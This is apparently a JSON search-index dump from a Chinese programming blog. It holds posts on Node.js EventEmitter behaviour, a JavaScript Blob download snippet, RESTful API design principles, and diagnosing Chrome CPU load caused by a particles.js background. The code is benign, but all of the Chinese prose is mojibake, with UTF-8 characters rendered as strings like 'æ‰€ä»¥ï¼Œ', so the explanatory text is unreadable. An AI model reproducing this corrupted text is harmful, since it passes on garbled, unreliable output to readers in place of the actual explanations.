(module.js:497:12) at Function.Module._load (module.js:489:3) at Function.Module.runMain (module.js:676:10) at startup (bootstrap_node.js:187:16) at bootstrap_node.js:608:3 æ‰€ä»¥ï¼Œæœ€å¥½æ€»æ˜¯ç»™EventEmitterå®ä¾‹æ·»åŠ ä¸€ä¸ªerrorçš„ç›‘å¬å™¨\nconst EventEmitter = require(\u0026#39;events\u0026#39;) class MyEmitter extends EventEmitter {} const myEmitter = new MyEmitter() myEmitter.on(\u0026#39;error\u0026#39;, (err) =\u0026gt; { console.log(err) }) console.log(1) myEmitter.emit(\u0026#39;error\u0026#39;, new Error(\u0026#39;test\u0026#39;)) console.log(2) 7. å†…éƒ¨äº‹ä»¶ newListenerä¸removeListener newListenerä¸removeListeneræ˜¯EventEmitterå®ä¾‹çš„è‡ªå¸¦çš„äº‹ä»¶ï¼Œä½ æœ€å¥½ä¸è¦ä½¿ç”¨åŒæ ·çš„åå­—ä½œä¸ºè‡ªå®šä¹‰çš„äº‹ä»¶åã€‚\nnewListeneråœ¨è®¢é˜…è€…è¢«åŠ å…¥åˆ°è®¢é˜…åˆ—è¡¨å‰è§¦å‘ removeListeneråœ¨è®¢é˜…è€…è¢«ç§»é™¤è®¢é˜…åˆ—è¡¨åè§¦å‘ // 06.js const EventEmitter = require(\u0026#39;events\u0026#39;) class MyEmitter extends EventEmitter {} const myEmitter = new MyEmitter() myEmitter.on(\u0026#39;newListener\u0026#39;, (event, listener) =\u0026gt; { console.log(\u0026#39;----\u0026#39;) console.log(event) console.log(listener) }) myEmitter.on(\u0026#39;myEmitter\u0026#39;, (err) =\u0026gt; { console.log(err) }) è¾“å‡ºï¼š\nä»è¾“å‡ºå¯ä»¥çœ‹å‡ºï¼Œå³ä½¿æ²¡æœ‰å»è§¦å‘myEmitteräº‹ä»¶ï¼Œon()æ–¹æ³•ä¹Ÿä¼šè§¦å‘newListeneräº‹ä»¶ã€‚\n---- myEmitter [Function] 8. äº‹ä»¶ç›‘å¬æ•°é‡é™åˆ¶ myEmitter.listenerCount(\u0026rsquo;event\u0026rsquo;): ç”¨æ¥è®¡ç®—ä¸€ä¸ªå®ä¾‹ä¸ŠæŸä¸ªäº‹ä»¶çš„ç›‘å¬è€…æ•°é‡ EventEmitter.defaultMaxListeners: EventEmitterç±»é»˜è®¤çš„æœ€å¤§ç›‘å¬è€…çš„æ•°é‡ï¼Œé»˜è®¤æ˜¯10ã€‚è¶…è¿‡ä¼šæœ‰è­¦å‘Šè¾“å‡ºã€‚ myEmitter.getMaxListeners()ï¼š EventEmitterå®ä¾‹é»˜è®¤çš„æŸä¸ªäº‹ä»¶æœ€å¤§ç›‘å¬è€…çš„æ•°é‡ï¼Œé»˜è®¤æ˜¯10ã€‚è¶…è¿‡ä¼šæœ‰è­¦å‘Šè¾“å‡ºã€‚ myEmitter.eventNames()ï¼š è¿”å›ä¸€ä¸ªå®ä¾‹ä¸Šåˆå¤šå°‘ç§äº‹ä»¶ EventEmitterå’ŒEventEmitterå®ä¾‹çš„æœ€å¤§ç›‘å¬æ•°é‡ä¸º10å¹¶ä¸æ˜¯ä¸€ä¸ªç¡¬æ€§è§„å®šï¼Œåªæ˜¯ä¸€ä¸ªæ¨èå€¼ï¼Œè¯¥å€¼å¯ä»¥é€šè¿‡setMaxListeners()æ¥å£å»æ”¹å˜ã€‚\næ”¹å˜EventEmitterçš„æœ€å¤§ç›‘å¬æ•°é‡ä¼šå½±å“åˆ°æ‰€æœ‰EventEmitterå®ä¾‹ è¯¥å˜EventEmitterå®ä¾‹çš„æœ€å¤§ç›‘å¬æ•°é‡åªä¼šå½±å“åˆ°å®ä¾‹è‡ªèº« å¦‚æ— å¿…è¦ï¼Œæœ€å¥½çš„ä¸è¦å»æ”¹å˜é»˜è®¤çš„ç›‘å¬æ•°é‡é™åˆ¶ã€‚äº‹ä»¶ç›‘å¬æ•°é‡æ˜¯nodeæ£€æµ‹å†…å­˜æ³„éœ²çš„ä¸€ä¸ªæ ‡å‡†ä¸€ä¸ªç»´åº¦ã€‚\nEventEmitterå®ä¾‹çš„æœ€å¤§ç›‘å¬æ•°é‡ä¸æ˜¯ä¸€ä¸ªå®ä¾‹çš„æ‰€æœ‰ç›‘å¬æ•°é‡ã€‚\nä¾‹å¦‚åŒä¸€ä¸ªå®ä¾‹Aç±»å‹äº‹ä»¶5ä¸ªç›‘å¬è€…ï¼ŒBç±»å‹äº‹ä»¶6ä¸ªç›‘å¬è€…ï¼Œè¿™ä¸ªå¹¶ä¸ä¼šæœ‰å‘Šè­¦ã€‚å¦‚æœAç±»å‹æœ‰11ä¸ªç›‘å¬è€…ï¼Œå°±ä¼šæœ‰å‘Šè­¦æç¤ºã€‚\nå¦‚æœåœ¨äº‹ä»¶ä¸­å‘ç°ç±»ä¼¼çš„å‘Šè­¦æç¤ºPossible EventEmitter memory leak detectedï¼Œè¦çŸ¥é“ä»äº‹ä»¶æœ€å¤§ç›‘å¬æ•°çš„è§’åº¦å»æ’æŸ¥é—®é¢˜ã€‚\n// 07.js const EventEmitter = require(\u0026#39;events\u0026#39;) class MyEmitter extends EventEmitter {} const myEmitter = new MyEmitter() const maxListeners = 11 for (let i = 0; i \u0026lt; maxListeners; i++) { myEmitter.on(\u0026#39;event\u0026#39;, (err) =\u0026gt; { console.log(err, 1) }) } myEmitter.on(\u0026#39;event1\u0026#39;, (err) =\u0026gt; { console.log(err, 11) }) console.log(myEmitter.listenerCount(\u0026#39;event\u0026#39;)) console.log(EventEmitter.defaultMaxListeners) console.log(myEmitter.getMaxListeners()) console.log(myEmitter.eventNames()) è¾“å‡ºï¼š\n11 10 10 [ \u0026#39;event\u0026#39;, \u0026#39;event1\u0026#39; ] (node:23957) MaxListenersExceededWarning: Possible EventEmitter memory leak detected. 11 event listeners added. Use emitter.setMaxListeners() to increase limit ","permalink":"https://wdd.js.org/posts/2018/08/deepin-nodejs-events/","summary":"1. ç¯å¢ƒ node 8.11.3 2. åŸºæœ¬ä½¿ç”¨ // 01.js const EventEmitter = require(\u0026#39;events\u0026#39;); class MyEmitter extends EventEmitter {} const myEmitter = new MyEmitter(); myEmitter.on(\u0026#39;event\u0026#39;, () =\u0026gt; { console.log(\u0026#39;an event occurred!\u0026#39;); }); myEmitter.emit(\u0026#39;event\u0026#39;); è¾“å‡ºï¼š\nan event occurred! 3. ä¼ å‚ä¸thisæŒ‡å‘ emit()æ–¹æ³•å¯ä»¥ä¼ ä¸é™åˆ¶æ•°é‡çš„å‚æ•°ã€‚ é™¤äº†ç®­å¤´å‡½æ•°å¤–ï¼Œåœ¨å›è°ƒå‡½æ•°å†…éƒ¨ï¼Œthisä¼šè¢«ç»‘å®šåˆ°EventEmitterç±»çš„å®ä¾‹ä¸Š // 02.js const EventEmitter = require(\u0026#39;events\u0026#39;) class MyEmitter extends EventEmitter {} const myEmitter = new MyEmitter() myEmitter.on(\u0026#39;event\u0026#39;, function (a, b){ console.log(a, b, this, this === myEmitter) }) myEmitter.on(\u0026#39;event\u0026#39;, (a, b) =\u0026gt; { console.","title":"NodeJS Events æ¨¡å—ç¬”è®°"},{"content":"éœ€æ±‚æè¿° å¯ä»¥æŠŠå­—ç¬¦ä¸²ä¸‹è½½æˆtxtæ–‡ä»¶ å¯ä»¥æŠŠå¯¹è±¡åºåˆ—åŒ–åä¸‹è½½jsonæ–‡ä»¶ ä¸‹è½½ç”±ajaxè¯·æ±‚è¿”å›çš„Excel, Word, pdf ç­‰ç­‰å…¶ä»–æ–‡ä»¶ åŸºæœ¬æ€æƒ³ downloadJsonIVR () { var data = {name: \u0026#39;age\u0026#39;} data = JSON.stringify(data) data = new Blob([data]) var a = document.createElement(\u0026#39;a\u0026#39;) var url = window.URL.createObjectURL(data) a.href = url a.download = \u0026#39;what-you-want.json\u0026#39; a.click() }, ä»å­—ç¬¦ä¸²ä¸‹è½½æ–‡ä»¶ ä»ajaxè¯·æ±‚ä¸­ä¸‹è½½æ–‡ä»¶ ","permalink":"https://wdd.js.org/posts/2018/06/js-download-file/","summary":"éœ€æ±‚æè¿° å¯ä»¥æŠŠå­—ç¬¦ä¸²ä¸‹è½½æˆtxtæ–‡ä»¶ å¯ä»¥æŠŠå¯¹è±¡åºåˆ—åŒ–åä¸‹è½½jsonæ–‡ä»¶ ä¸‹è½½ç”±ajaxè¯·æ±‚è¿”å›çš„Excel, Word, pdf ç­‰ç­‰å…¶ä»–æ–‡ä»¶ åŸºæœ¬æ€æƒ³ downloadJsonIVR () { var data = {name: \u0026#39;age\u0026#39;} data = JSON.stringify(data) data = new Blob([data]) var a = document.createElement(\u0026#39;a\u0026#39;) var url = window.URL.createObjectURL(data) a.href = url a.download = \u0026#39;what-you-want.json\u0026#39; a.click() }, ä»å­—ç¬¦ä¸²ä¸‹è½½æ–‡ä»¶ ä»ajaxè¯·æ±‚ä¸­ä¸‹è½½æ–‡ä»¶ ","title":"JavaScriptåŠ¨æ€ä¸‹è½½æ–‡ä»¶"},{"content":" 1. ä»€ä¹ˆæ˜¯REST? 2. REST APIæœ€ä¸ºé‡è¦çš„çº¦æŸ 3. REST API HTTPæ–¹æ³• ä¸ CURD 4. çŠ¶æ€ç  5. RESTfulæ¶æ„è®¾è®¡ 6. æ–‡æ¡£ 7. ç‰ˆæœ¬ 8. æ·±å…¥ç†è§£çŠ¶æ€ä¸æ— çŠ¶æ€ 9. å‚è€ƒ 1. ä»€ä¹ˆæ˜¯REST? è¡¨ç°å±‚çŠ¶æ€è½¬æ¢ï¼ˆRESTï¼Œè‹±æ–‡ï¼šRepresentational State Transferï¼‰æ˜¯Roy Thomas Fieldingåšå£«äº2000å¹´åœ¨ä»–çš„åšå£«è®ºæ–‡[1] ä¸­æå‡ºæ¥çš„ä¸€ç§ä¸‡ç»´ç½‘è½¯ä»¶æ¶æ„é£æ ¼ï¼Œç›®çš„æ˜¯ä¾¿äºä¸åŒè½¯ä»¶/ç¨‹åºåœ¨ç½‘ç»œï¼ˆä¾‹å¦‚äº’è”ç½‘ï¼‰ä¸­äº’ç›¸ä¼ é€’ä¿¡æ¯ã€‚è¡¨ç°å±‚çŠ¶æ€è½¬æ¢ï¼ˆRESTï¼Œè‹±æ–‡ï¼šRepresentational State Transferï¼‰æ˜¯æ ¹åŸºäºè¶…æ–‡æœ¬ä¼ è¾“åè®®(HTTP)ä¹‹ä¸Šè€Œç¡®å®šçš„ä¸€ç»„çº¦æŸå’Œå±æ€§ï¼Œæ˜¯ä¸€ç§è®¾è®¡æä¾›ä¸‡ç»´ç½‘ç»œæœåŠ¡çš„è½¯ä»¶æ„å»ºé£æ ¼ã€‚åŒ¹é…æˆ–å…¼å®¹äºè¿™ç§æ¶æ„é£æ ¼(ç®€ç§°ä¸º REST æˆ– RESTful)çš„ç½‘ç»œæœåŠ¡ï¼Œå…è®¸å®¢æˆ·ç«¯å‘å‡ºä»¥ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦è®¿é—®å’Œæ“ä½œç½‘ç»œèµ„æºçš„è¯·æ±‚ï¼Œè€Œä¸é¢„å…ˆå®šä¹‰å¥½çš„æ— çŠ¶æ€æ“ä½œé›†ä¸€è‡´åŒ–ã€‚wikipdeia\nREST API ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†æˆ–è€…ä¸€ä¸ªæ˜¯åè®®ï¼Œä»…ä»…æ˜¯ä¸€ç§é£æ ¼ï¼Œä¸€ç§styleã€‚\nRESTful APIçš„ç®€å•å®šä¹‰å¯ä»¥è½»æ¾è§£é‡Šè¿™ä¸ªæ¦‚å¿µã€‚ RESTæ˜¯ä¸€ç§æ¶æ„é£æ ¼ï¼ŒRESTfulæ˜¯å®ƒçš„è§£é‡Šã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæ‚¨çš„åç«¯æœåŠ¡å™¨å…·æœ‰REST APIï¼Œå¹¶ä¸”æ‚¨ï¼ˆä»ç½‘ç«™/åº”ç”¨ç¨‹åºï¼‰å‘å®¢æˆ·ç«¯è¯·æ±‚æ­¤APIï¼Œåˆ™æ‚¨çš„å®¢æˆ·ç«¯ä¸ºRESTfulã€‚\n2. REST APIæœ€ä¸ºé‡è¦çš„çº¦æŸ Client-Server é€šä¿¡åªèƒ½ç”±å®¢æˆ·ç«¯å•æ–¹é¢å‘èµ·ï¼Œè¡¨ç°ä¸ºè¯·æ±‚-å“åº”çš„å½¢å¼ Stateless é€šä¿¡çš„ä¼šè¯çŠ¶æ€ï¼ˆSession Stateï¼‰åº”è¯¥å…¨éƒ¨ç”±å®¢æˆ·ç«¯è´Ÿè´£ç»´æŠ¤ Cache å“åº”å†…å®¹å¯ä»¥åœ¨é€šä¿¡é“¾çš„æŸå¤„è¢«ç¼“å­˜ï¼Œä»¥æ”¹å–„ç½‘ç»œæ•ˆç‡ Uniform Interface é€šä¿¡é“¾çš„ç»„ä»¶ä¹‹é—´é€šè¿‡ç»Ÿä¸€çš„æ¥å£ç›¸äº’é€šä¿¡ï¼Œä»¥æé«˜äº¤äº’çš„å¯è§æ€§ Layered System é€šè¿‡é™åˆ¶ç»„ä»¶çš„è¡Œä¸ºï¼ˆå³æ¯ä¸ªç»„ä»¶åªèƒ½â€œçœ‹åˆ°â€ä¸å…¶äº¤äº’çš„ç´§é‚»å±‚ï¼‰ï¼Œå°†æ¶æ„åˆ†è§£ä¸ºè‹¥å¹²ç­‰çº§çš„å±‚ã€‚ Code-On-Demand æ”¯æŒé€šè¿‡ä¸‹è½½å¹¶æ‰§è¡Œä¸€äº›ä»£ç ï¼ˆä¾‹å¦‚Java Appletã€Flashæˆ–JavaScriptï¼‰ï¼Œå¯¹å®¢æˆ·ç«¯çš„åŠŸèƒ½è¿›è¡Œæ‰©å±•ã€‚ 3. REST API HTTPæ–¹æ³• ä¸ CURD REST API ä½¿ç”¨POSTï¼ŒGET, PUT, DELETEçš„HTTPæ–¹æ³•æ¥æè¿°å¯¹èµ„æºçš„å¢ã€æŸ¥ã€æ”¹ã€åˆ ã€‚ è¿™å››ä¸ªHTTPæ–¹æ³•åœ¨æ•°æ®å±‚å¯¹åº”ç€SQLçš„æ’å…¥ã€æŸ¥è¯¢ã€æ›´æ–°ã€åˆ é™¤æ“ä½œã€‚\n4. çŠ¶æ€ç  1xx - informational; 2xx - success; 3xx - redirection; 4xx - client error; 5xx - server error. 5. RESTfulæ¶æ„è®¾è®¡ GET /users - get all users; GET /users/123 - get a particular user with id = 123; GET /posts - get all posts. POST /users. PUT /users/123 - upgrade a user entity with id = 123. DELETE /users/123 - delete a user with id = 123. 6. æ–‡æ¡£ 7. ç‰ˆæœ¬ ç‰ˆæœ¬ç®¡ç†ä¸€èˆ¬æœ‰ä¸¤ç§\nä½äºurlä¸­çš„ç‰ˆæœ¬æ ‡è¯†ï¼š http://example.com/api/v1 ä½äºè¯·æ±‚å¤´ä¸­çš„ç‰ˆæœ¬æ ‡è¯†ï¼šAccept: application/vnd.redkavasyl+json; version=2.0 8. æ·±å…¥ç†è§£çŠ¶æ€ä¸æ— çŠ¶æ€ æˆ‘è®¤ä¸ºRESTæ¶æ„æœ€éš¾ç†è§£çš„å°±æ˜¯çŠ¶æ€ä¸æ— çŠ¶æ€ã€‚ä¸‹é¢æˆ‘ç”»å‡ºä¸¤ä¸ªç¤ºæ„å›¾ã€‚\nå›¾1æ˜¯æœ‰çŠ¶æ€çš„æœåŠ¡ï¼ŒçŠ¶æ€å­˜å‚¨äºå•ä¸ªæœåŠ¡ä¹‹ä¸­ï¼Œä¸€æ—¦ä¸€ä¸ªæœåŠ¡æŒ‚äº†ï¼ŒçŠ¶æ€å°±æ²¡äº†ï¼Œæœ‰çŠ¶æ€æœåŠ¡å¾ˆéš¾æ‰©å±•ã€‚æ— çŠ¶æ€çš„æœåŠ¡ï¼ŒçŠ¶æ€å­˜å‚¨äºå®¢æˆ·ç«¯ï¼Œä¸€ä¸ªè¯·æ±‚å¯ä»¥è¢«æŠ•é€’åˆ°ä»»ä½•æœåŠ¡ç«¯ï¼Œå³ä½¿ä¸€ä¸ªæœåŠ¡æŒ‚äº†ï¼Œä¹Ÿä¸å›å½±å“åˆ°åŒä¸€ä¸ªå®¢æˆ·ç«¯å‘æ¥çš„ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚\nã€å›¾1 æœ‰çŠ¶æ€çš„æ¶æ„ã€‘\nã€å›¾2 æ— çŠ¶æ€çš„æ¶æ„ã€‘\neach request from client to server must contain all of the information necessary to understand the request, and cannot take advantage of any stored context on the server. Session state is therefore kept entirely on the client. rest_arch_style stateless\næ¯ä¸€ä¸ªè¯·æ±‚è‡ªèº«å¿…é¡»æºå¸¦æ‰€æœ‰çš„ä¿¡æ¯ï¼Œè®©å®¢æˆ·ç«¯ç†è§£è¿™ä¸ªè¯·æ±‚ã€‚ä¸¾ä¸ªæ —å­ï¼Œå¸¸è§çš„ç¿»é¡µæ“ä½œï¼Œåº”è¯¥å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡ç«¯æƒ³è¦çœ‹ç¬¬å‡ é¡µçš„æ•°æ®ï¼Œè€Œä¸åº”è¯¥è®©æœåŠ¡ç«¯è®°ä½å®¢æˆ·ç«¯çœ‹åˆ°äº†ç¬¬å‡ é¡µã€‚\n9. å‚è€ƒ A Beginnerâ€™s Tutorial for Understanding RESTful API Versioning REST Services ","permalink":"https://wdd.js.org/posts/2018/06/think-about-restful-api/","summary":"1. ä»€ä¹ˆæ˜¯REST? 2. REST APIæœ€ä¸ºé‡è¦çš„çº¦æŸ 3. REST API HTTPæ–¹æ³• ä¸ CURD 4. çŠ¶æ€ç  5. RESTfulæ¶æ„è®¾è®¡ 6. æ–‡æ¡£ 7. ç‰ˆæœ¬ 8. æ·±å…¥ç†è§£çŠ¶æ€ä¸æ— çŠ¶æ€ 9. å‚è€ƒ 1. ä»€ä¹ˆæ˜¯REST? è¡¨ç°å±‚çŠ¶æ€è½¬æ¢ï¼ˆRESTï¼Œè‹±æ–‡ï¼šRepresentational State Transferï¼‰æ˜¯Roy Thomas Fieldingåšå£«äº2000å¹´åœ¨ä»–çš„åšå£«è®ºæ–‡[1] ä¸­æå‡ºæ¥çš„ä¸€ç§ä¸‡ç»´ç½‘è½¯ä»¶æ¶æ„é£æ ¼ï¼Œç›®çš„æ˜¯ä¾¿äºä¸åŒè½¯ä»¶/ç¨‹åºåœ¨ç½‘ç»œï¼ˆä¾‹å¦‚äº’è”ç½‘ï¼‰ä¸­äº’ç›¸ä¼ é€’ä¿¡æ¯ã€‚è¡¨ç°å±‚çŠ¶æ€è½¬æ¢ï¼ˆRESTï¼Œè‹±æ–‡ï¼šRepresentational State Transferï¼‰æ˜¯æ ¹åŸºäºè¶…æ–‡æœ¬ä¼ è¾“åè®®(HTTP)ä¹‹ä¸Šè€Œç¡®å®šçš„ä¸€ç»„çº¦æŸå’Œå±æ€§ï¼Œæ˜¯ä¸€ç§è®¾è®¡æä¾›ä¸‡ç»´ç½‘ç»œæœåŠ¡çš„è½¯ä»¶æ„å»ºé£æ ¼ã€‚åŒ¹é…æˆ–å…¼å®¹äºè¿™ç§æ¶æ„é£æ ¼(ç®€ç§°ä¸º REST æˆ– RESTful)çš„ç½‘ç»œæœåŠ¡ï¼Œå…è®¸å®¢æˆ·ç«¯å‘å‡ºä»¥ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦è®¿é—®å’Œæ“ä½œç½‘ç»œèµ„æºçš„è¯·æ±‚ï¼Œè€Œä¸é¢„å…ˆå®šä¹‰å¥½çš„æ— çŠ¶æ€æ“ä½œé›†ä¸€è‡´åŒ–ã€‚wikipdeia\nREST API ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†æˆ–è€…ä¸€ä¸ªæ˜¯åè®®ï¼Œä»…ä»…æ˜¯ä¸€ç§é£æ ¼ï¼Œä¸€ç§styleã€‚\nRESTful APIçš„ç®€å•å®šä¹‰å¯ä»¥è½»æ¾è§£é‡Šè¿™ä¸ªæ¦‚å¿µã€‚ RESTæ˜¯ä¸€ç§æ¶æ„é£æ ¼ï¼ŒRESTfulæ˜¯å®ƒçš„è§£é‡Šã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæ‚¨çš„åç«¯æœåŠ¡å™¨å…·æœ‰REST APIï¼Œå¹¶ä¸”æ‚¨ï¼ˆä»ç½‘ç«™/åº”ç”¨ç¨‹åºï¼‰å‘å®¢æˆ·ç«¯è¯·æ±‚æ­¤APIï¼Œåˆ™æ‚¨çš„å®¢æˆ·ç«¯ä¸ºRESTfulã€‚\n2. REST APIæœ€ä¸ºé‡è¦çš„çº¦æŸ Client-Server é€šä¿¡åªèƒ½ç”±å®¢æˆ·ç«¯å•æ–¹é¢å‘èµ·ï¼Œè¡¨ç°ä¸ºè¯·æ±‚-å“åº”çš„å½¢å¼ Stateless é€šä¿¡çš„ä¼šè¯çŠ¶æ€ï¼ˆSession Stateï¼‰åº”è¯¥å…¨éƒ¨ç”±å®¢æˆ·ç«¯è´Ÿè´£ç»´æŠ¤ Cache å“åº”å†…å®¹å¯ä»¥åœ¨é€šä¿¡é“¾çš„æŸå¤„è¢«ç¼“å­˜ï¼Œä»¥æ”¹å–„ç½‘ç»œæ•ˆç‡ Uniform Interface é€šä¿¡é“¾çš„ç»„ä»¶ä¹‹é—´é€šè¿‡ç»Ÿä¸€çš„æ¥å£ç›¸äº’é€šä¿¡ï¼Œä»¥æé«˜äº¤äº’çš„å¯è§æ€§ Layered System é€šè¿‡é™åˆ¶ç»„ä»¶çš„è¡Œä¸ºï¼ˆå³æ¯ä¸ªç»„ä»¶åªèƒ½â€œçœ‹åˆ°â€ä¸å…¶äº¤äº’çš„ç´§é‚»å±‚ï¼‰ï¼Œå°†æ¶æ„åˆ†è§£ä¸ºè‹¥å¹²ç­‰çº§çš„å±‚ã€‚ Code-On-Demand æ”¯æŒé€šè¿‡ä¸‹è½½å¹¶æ‰§è¡Œä¸€äº›ä»£ç ï¼ˆä¾‹å¦‚Java Appletã€Flashæˆ–JavaScriptï¼‰ï¼Œå¯¹å®¢æˆ·ç«¯çš„åŠŸèƒ½è¿›è¡Œæ‰©å±•ã€‚ 3. REST API HTTPæ–¹æ³• ä¸ CURD REST API ä½¿ç”¨POSTï¼ŒGET, PUT, DELETEçš„HTTPæ–¹æ³•æ¥æè¿°å¯¹èµ„æºçš„å¢ã€æŸ¥ã€æ”¹ã€åˆ ã€‚ è¿™å››ä¸ªHTTPæ–¹æ³•åœ¨æ•°æ®å±‚å¯¹åº”ç€SQLçš„æ’å…¥ã€æŸ¥è¯¢ã€æ›´æ–°ã€åˆ é™¤æ“ä½œã€‚","title":"Restful API æ¶æ„æ€è€ƒ"},{"content":"1. é—®é¢˜ç°è±¡ æœ‰æ—¶å€™å‘ç°macé£æ‰‡å“çš„å‰å®³ï¼Œäºæ˜¯æˆ‘æ£€æŸ¥äº†macç³»ç»Ÿçš„æ´»åŠ¨ç›‘è§†å™¨ï¼Œå‘ç°Google Chrome Helperå ç”¨99%çš„CPUã€‚\né€šå¸¸æ¥è¯´Chromeå¦‚æœå ç”¨è¿‡é«˜çš„å†…å­˜ï¼Œè¿™å¹¶ä¸æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Œæ¯•ç«ŸChromeçš„æ€§èƒ½ä»¥åŠæ˜“ç”¨æ€§æ˜¯å»ºç«‹åœ¨å ç”¨å¾ˆå¤šå†…å­˜çš„åŸºç¡€ä¸Šçš„ã€‚ä½†æ˜¯æ— è®ºä»€ä¹ˆç¨‹åºï¼ŒæŒç»­çš„å ç”¨è¶…è¿‡80%çš„cpuï¼Œéƒ½æ˜¯æä¸æ­£å¸¸çš„ã€‚å¤§å¤šæ•°ç¨‹åºéƒ½æ˜¯å ç”¨ç»´æŒåœ¨ä½äº10%çš„CPUã€‚\næ´»åŠ¨ç›‘è§†å™¨æŒ‡å‡ºé—®é¢˜å‡ºç°åœ¨Chromeæµè§ˆå™¨ã€‚é‚£ä¹ˆé—®é¢˜å¯ä»¥å†æ¬¡ç»†åˆ†ä¸ºä¸‰å—ã€‚\nChromeç³»ç»Ÿè‡ªèº«é—®é¢˜ ä¸€äº›æ’ä»¶ï¼Œä¾‹å¦‚flashæ’ä»¶ï¼Œæ‰©å±•æ’ä»¶ ç½‘é¡µç¨‹åºjså‡ºç°çš„é—®é¢˜ 2. ä»ä»»åŠ¡ç®¡ç†å™¨ç€æ‰‹ å…¶å®Chromeæµè§ˆå™¨è‡ªèº«ä¹Ÿæ˜¯æœ‰ä»»åŠ¡ç®¡ç†å™¨çš„ï¼Œä¸€èˆ¬æ¥è¯´windowsç‰ˆchromeæŒ‰ä½shift+escå°±ä¼šè°ƒå‡ºä»»åŠ¡ç®¡ç†å™¨çª—å£ã€‚macç‰ˆè°ƒå‡ºä»»åŠ¡ç®¡ç†å™¨æ²¡æœ‰å¿«æ·ï¼Œåªèƒ½é€šè¿‡Window \u0026gt; Task Managerè°ƒå‡ºã€‚\nè°ƒå‡ºä»»åŠ¡ç®¡ç†å™¨åï¼Œå‘ç°ä¸€ä¸ªæ ‡ç­¾é¡µï¼ŒCPUå ç”¨ç‡è¾¾åˆ°99%ï¼Œ é‚£å°±è¯´æ˜ï¼Œåº”è¯¥æ˜¯è¿™ä¸ªæ ‡ç­¾é¡µä¸­å­˜åœ¨æŒç»­å ç”¨å¤§é‡CPUè®¡ç®—çš„ç¨‹åºã€‚\næœ€åæ‰¾åˆ°è¿™ä¸ªé¡µé¢ï¼Œå‘ç°è¯¥é¡µé¢èƒŒæ™¯å›¾æ˜¯ä¸€ç§åŠ¨æ€ç²’å­å›¾ã€‚å°±æ˜¯åŸºäºparticles.jsåšçš„ã€‚æˆ‘æƒ³ï¼Œç»ˆäºæ‰¾åˆ°ä½ äº†ã€‚\näºæ˜¯æˆ‘æŠŠè¿™ä¸ªåŠ¨æ€å›¾çš„ç›¸å…³jsä»£ç ç»™æ³¨é‡Šæ‰ï¼Œç”µè„‘çš„é£æ‰‡ä¹Ÿç»ˆäºå˜å¾—å®‰é™äº†ã€‚\n3. é—®é¢˜æ€»ç»“ é—®é¢˜è§£å†³çš„æ€»ç»“ï¼šè§£å†³é—®é¢˜çš„æ–¹æ³•æ—¶å¾ˆç®€å•çš„ï¼ŒåŸºäºä¸€ä¸ªç°è±¡ï¼Œæ‰¾åˆ°ä¸€ä¸ªåŸå› ï¼ŒåŸºäºè¿™ä¸ªåŸå› å†æ‰¾åˆ°ä¸€ä¸ªç°è±¡ï¼Œç„¶åä¸€æ­¥ä¸€æ­¥ç¼©å°é—®é¢˜èŒƒå›´ï¼Œé€¼è¿‘æœ€ç»ˆåŸå› ã€‚\næœºå™¨CPUè¿‡é«˜ï¼Œä¸€èˆ¬éƒ½æ˜¯å¯ä»¥ä»ä»»åŠ¡ç®¡ç†å™¨ç€æ‰‹è§£å†³ã€‚ç³»ç»Ÿçš„ä»»åŠ¡ç®¡ç†å™¨å¯ä»¥ç›‘æ§å„ä¸ªç¨‹åºå ç”¨çš„CPUæ˜¯å¦æ­£å¸¸ï¼Œé€šå¸¸ç¨‹åºè‡ªèº«ä¹Ÿæ˜¯æœ‰ä»»åŠ¡ç®¡ç†çš„ã€‚\nåƒè°·æ­Œæµè§ˆå™¨è¿™ç§è½¯ä»¶ï¼Œå‡ ä¹æœ¬èº«å°±æ˜¯ä¸€ä¸ªæ“ä½œç³»ç»Ÿï¼Œæ‰€ä»¥è¯´å®ƒçš„ä»»åŠ¡ç®¡ç†å™¨ä¹Ÿæ˜¯å¿…ä¸å¯å°‘çš„ã€‚Chromeæµè§ˆå™¨å†å¸¦çš„ä»»åŠ¡ç®¡ç†å™¨å¯ä»¥å‘Šè¯‰ä½ å‡ ä¸ªå…³é”®ä¿¡æ¯ã€‚\nä»»åŠ¡å ç”¨çš„å†…å­˜ ä»»åŠ¡å ç”¨çš„CPU ä»»åŠ¡å ç”¨çš„ç½‘ç»œæµé‡å¤§å° å¦‚æœä½ ä¸€æ‰“å¼€è°·æ­Œæµè§ˆå™¨ï¼Œä½ çš„ç”µè„‘é£æ‰‡å°±æ‹¼å‘½è½¬ï¼Œé‚£ä½ æœ€å¥½æ‰“å¼€è°·æ­Œæµè§ˆå™¨çš„ä»»åŠ¡ç®¡ç†å™¨çœ‹çœ‹ã€‚\n4. å…³äºåŠ¨æ€èƒŒæ™¯å›¾çš„æ€è€ƒ åŠ¨æ€èƒŒæ™¯å›¾å¾€å¾€éƒ½ä¼šç»™äººå¾ˆé…·ç‚«çš„æ„Ÿè§‰ï¼Œä½†æ˜¯è¿™ç§èƒŒæ™¯å›¾çš„åˆ¶ä½œå¹¶ä¸æ˜¯å¾ˆå¤æ‚ï¼Œå¦‚æœä½ ä½¿ç”¨particles.jsæ¥åˆ¶ä½œï¼Œåˆ¶ä½œä¸€äº›åŠ¨æ€èƒŒæ™¯å›¾åªéœ€è¦å‡ è¡Œä»£ç å°±å¯ä»¥æå®šã€‚ä½†æ˜¯è¿™ç§é…·ç‚«çš„èƒŒåï¼ŒCPUä¹Ÿåœ¨æ‰¿å—ç€å‹åŠ›ã€‚\nparticles.jsæä¾›çš„demoæ•ˆæœå›¾ï¼Œåœ¨Chromeä¸­CPUä¼šè¢«æé«˜åˆ°100%ã€‚\nä¹Ÿæœ‰å‡ å®¶ä½¿ç”¨åŠ¨æ€èƒŒæ™¯å›¾çš„å®˜ç½‘ã€‚æˆ‘è®°å¾—çŸ¥ä¹ä»¥å‰å°±ç”¨è¿‡åŠ¨æ€èƒŒæ™¯å›¾ï¼Œä½†æ˜¯ç°åœ¨æ‰¾ä¸åˆ°äº†ã€‚å¦å¤–ä¸€ä¸ªä½¿ç”¨åŠ¨æ€èƒŒæ™¯å›¾çš„æ˜¯daocloud, 